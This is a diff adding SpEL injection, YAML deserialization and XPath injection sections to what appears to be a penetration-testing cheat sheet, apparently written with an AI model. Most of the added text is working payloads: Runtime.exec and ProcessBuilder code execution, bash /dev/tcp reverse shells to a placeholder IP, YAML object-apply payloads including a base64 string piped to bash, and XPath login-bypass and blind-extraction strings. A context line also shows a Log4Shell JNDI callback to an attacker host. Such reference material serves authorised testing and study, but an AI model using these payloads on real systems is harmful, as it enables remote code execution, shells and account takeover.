@@ -219,6 +219,35 @@ python3 -m http.server 8000
 curl http://target.com/ -H 'User-Agent: ${jndi:ldap://<AttackerIP>:1389/a}'
 ```
 
+### Spring EL (SpEL) Injection
+
+SpEL expressions evaluated server-side from user input — different from SSTI in template engines. Occurs in `@Value` annotations, `ExpressionParser`, Spring Security expressions, and framework components that call `parseExpression(userInput)`.
+
+```bash
+# Detection probe — if 49 appears in response, SpEL is evaluating
+#{7*7}
+${7*7}
+T(java.lang.Math).random()
+
+# RCE — exec returns a Process, not output; use redirect or OOB
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+
+# Capture output — write to temp file and read it back
+#{T(java.lang.Runtime).getRuntime().exec(new String[]{'/bin/bash','-c','id > /tmp/out'})}
+
+# Reverse shell via ProcessBuilder
+#{new java.lang.ProcessBuilder(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"}).start()}
+
+# Common injection points
+# - GET/POST parameter passed to @Query("...#{#param}...")  (Spring Data)
+# - User-controlled field in @PreAuthorize / @PostAuthorize
+# - Email template / greeting fields that use SpEL internally
+```
+
+> [!note] SpEL vs SSTI: SSTI is in a template engine (Thymeleaf, Freemarker). SpEL injection is in Spring's own expression evaluator — look for `#{...}` or `${...}` syntax being reflected/evaluated in app logic, not just views.
+
+---
+
 ### Spring4Shell (CVE-2022-22965)
 
 Spring MVC with JDK 9+, Tomcat as WAR deployment.
@@ -432,6 +461,41 @@ print(payload)
 curl http://target.com/ --cookie "data=<base64_payload>"
 ```
 
+### YAML Deserialization
+
+`yaml.load()` without a safe loader executes arbitrary Python constructors. Affects Python apps that load user-supplied YAML config, profiles, or API payloads.
+
+```python
+# Vulnerable code pattern
+import yaml
+data = yaml.load(user_input)          # unsafe — NEVER do this
+
+# Safe version
+data = yaml.safe_load(user_input)     # only loads basic YAML types
+data = yaml.load(user_input, Loader=yaml.SafeLoader)  # explicit safe loader
+```
+
+```bash
+# Detection: send YAML to any endpoint that accepts YAML content type
+# Content-Type: application/x-yaml or application/yaml
+
+# RCE payload — !!python/object/apply executes a callable with args
+!!python/object/apply:os.system ["id"]
+
+# With subprocess for arg list (avoids shell quoting issues)
+!!python/object/apply:subprocess.check_output [["id"]]
+
+# Reverse shell
+!!python/object/apply:os.system ["bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'"]
+
+# File write (if exec doesn't work directly)
+!!python/object/apply:subprocess.check_output [["bash","-c","echo YmFzaCAtaS4uLg== | base64 -d | bash"]]
+```
+
+> [!note] Also affects Ruby (`YAML.load` with Psych) and Node.js (`js-yaml` with `safeLoad` vs `load`). Same `!!` constructor prefix syntax applies across implementations.
+
+---
+
 ### Django Secret Key → Session Forgery
 
 ```bash
@@ -619,6 +683,54 @@ username=attacker&password=pass&user[admin]=1&user[role]=admin
 
 ---
 
+## XPath Injection
+
+XML-backed authentication or data retrieval in Java (SAX/DOM/JAXB), .NET (`XmlDocument`/`XPathNavigator`), or Node (`xpath` module). Works like SQL injection but against XPath expressions evaluating XML data.
+
+### Detection
+
+```bash
+# Inject into login or search fields that may use XPath
+# Single quote breaks the query — look for XML parser errors or unexpected auth bypass
+'
+' or '1'='1
+" or "1"="1
+```
+
+### Auth Bypass
+
+```bash
+# Target: XPath expression like //users/user[name/text()='<INPUT>' and password/text()='<INPUT>']
+# Auth bypass payloads
+Username: ' or '1'='1
+Password: ' or '1'='1
+
+Username: admin' or '1'='1' or 'x'='y
+Password: anything
+
+# Equivalent: //users/user[name/text()='' or '1'='1' and password/text()='' or '1'='1']
+# → returns first user node regardless of password
+```
+
+### Blind Extraction (Boolean-Based)
+
+```bash
+# Check if first char of first username is 'a'
+' or substring(//user[1]/username/text(),1,1)='a' or 'x'='y
+
+# Count nodes
+' or count(//user)=1 or 'x'='y
+
+# Length of first username
+' or string-length(//user[1]/username/text())=5 or 'x'='y
+
+# Automate with Burp Intruder — iterate chars across all positions
+```
+
+> [!note] XPath injection affects any language that builds XPath strings via string concatenation. Common in Java Spring LDAP, .NET Forms Authentication against XML stores, and legacy Node.js/Ruby apps using XML for config-driven auth.
+
+---
+
 ## Go
 
 ### Fingerprinting
@@ -711,5 +823,5 @@ Identify stack (whatweb, headers, cookies, error pages)
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
